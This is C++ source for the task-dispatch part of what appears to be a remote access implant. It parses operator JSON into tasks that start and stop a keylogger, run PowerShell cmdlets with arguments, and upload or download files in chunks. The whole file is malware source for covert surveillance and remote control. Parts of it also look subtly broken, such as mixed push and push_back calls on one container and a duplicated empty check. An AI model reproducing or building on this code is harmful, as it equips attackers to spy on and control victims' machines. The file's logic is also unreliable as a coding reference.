#include "TaskQueueManager.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "Task.h"
#include <Keylogger.h>

#define SUCCESSFUL "Successful"
#define FAILURE "Failure"

Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
{

	rapidjson::Document doc = {};
	doc.Parse(rawJson.c_str());

	int taskID = doc["TaskID"].GetInt();
	int type = doc["TaskType"].GetInt();
	int code = doc["TaskCode"].GetInt();
	int status = doc["Status"].GetInt();
	const rapidjson::Value &node = doc["Command"];

	switch (type)
	{

	case KEYLOGGER_START:
	{
		return CreateTaskRequest<CommandKeylogger>(taskID, KEYLOGGER_START, NO_CODE, status, CommandKeylogger{});
	}
	break;

	case KEYLOGGER_STOP:
	{
		return CreateTaskRequest<CommandKeylogger>(taskID, KEYLOGGER_STOP, NO_CODE, status, CommandKeylogger{});
	}
	break;

	case POWERSHELL:
	{
		auto cmd = node["Commandlet"].GetString();
		auto arg = node["Arguements"].GetString();
		return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{cmd, arg});
	}
		break;

	case UPLOAD:
	{
		if (!node.HasMember("Path") || !node["Path"].IsString())
			return TaskRequest<bool>{};

		return TaskRequest<CommandUploadFile>{
			taskID, type, code, status,
			CommandUploadFile{node["Path"].GetString()}};
	}

	// TODO : CHANGE TO USE CreateTaskRequest
	case DOWNLOAD:
	{
		if (code != DOWNLOAD ||
			!node.HasMember("Path") ||
			!node["Path"].IsString())
		{
			return TaskRequest<bool>{};
		}

		const char *data =
			node.HasMember("Data") && node["Data"].IsString()
				? node["Data"].GetString()
				: "";

		const auto offset =
			node.HasMember("Offset") && node["Offset"].IsInt64()
				? node["Offset"].GetInt64()
				: 0;

		const auto totalBytes =
			node.HasMember("TotalBytes") && node["TotalBytes"].IsInt64()
				? node["TotalBytes"].GetInt64()
				: 0;

		const bool final =
			node.HasMember("Final") && node["Final"].IsBool()
				? node["Final"].GetBool()
				: false;

		return CreateTaskRequest<CommandDownloadFile>(
			taskID,
			type,
			code,
			status,
			CommandDownloadFile{
				node["Path"].GetString(),
				data,
				offset,
				totalBytes,
				final});
	}

	default:
		TaskRequest<bool> test;
		return test;
	}
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor
TaskQueueManager::TaskQueueManager()
{
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
bool TaskQueueManager::HasPendingResult()
{
	return taskResults.size() > 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
bool TaskQueueManager::HasPendingTask()
{
	return taskQueue.size() > 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void TaskQueueManager::StoreTaskResult(Response &response)
{
	std::string json = std::visit([](const auto &responseEnvelope)
								  { return responseEnvelope.StructToJson(); }, response);

	taskResults.push(json);
	taskResults.push_back(response);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string TaskQueueManager::GetTaskResults()
{
	std::string json = CreateResponseTaskValue(taskResults);
	return json;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void TaskQueueManager::QueueTask(std::string blob)
{
	if (blob.empty())
		return;
	if (blob.empty())
		return;
	if (blob.length() == 36)
		return;
	taskQueue.push(blob);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
Request TaskQueueManager::GetNextTask()
{
	std::string taskBlob = taskQueue.front();
	taskQueue.pop();
	return ParseTaskRequest(taskBlob);
}
